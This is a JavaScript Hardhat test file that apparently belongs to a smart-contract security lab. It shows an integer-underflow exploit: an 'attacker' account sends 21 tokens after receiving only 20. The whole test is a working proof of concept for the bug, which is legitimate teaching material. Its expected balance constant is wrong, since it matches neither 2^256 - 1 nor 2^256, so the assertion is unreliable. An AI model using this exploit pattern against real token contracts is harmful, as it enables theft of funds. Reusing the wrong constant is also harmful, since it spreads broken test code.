import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, utils } from "ethers";

describe("Token", function () {
  // We define a fixture to reuse the same setup in every test.
  // We use loadFixture to run this setup once, snapshot that state,
  // and reset Hardhat Network to that snapshot in every test.
  async function deployFixture() {

    // Contracts are deployed using the first signer/account by default
    const [victim, attacker, thirdParty] = await ethers.getSigners();

    const Token = await ethers.getContractFactory("Token");
    const token = await Token.connect(victim).deploy(utils.parseUnits("1000000", 18));

    return { token, victim, attacker, thirdParty };
  }


  it("Attacker should be able to trigger an underflow on vulnerable contract", async function () {
    const { token, victim, attacker, thirdParty } = await loadFixture(deployFixture);
    
    // execute the underflow vulnerability
    const victimToken = token.connect(victim)
    const txInitial = await victimToken.transfer(attacker.address, utils.parseUnits("20", 18))
    await txInitial.wait()

    // execute the underflow vulnerability
    const attackerToken = token.connect(attacker)
    const txAttack = await attackerToken.transfer(thirdParty.address, utils.parseUnits("21", 18))
    await txAttack.wait()

    expect(await attackerToken.balanceOf(attacker.address)).to.equal(BigNumber.from("115792089237316195423570985008687907853269984665640564039456584007913129639936"))
  });

});
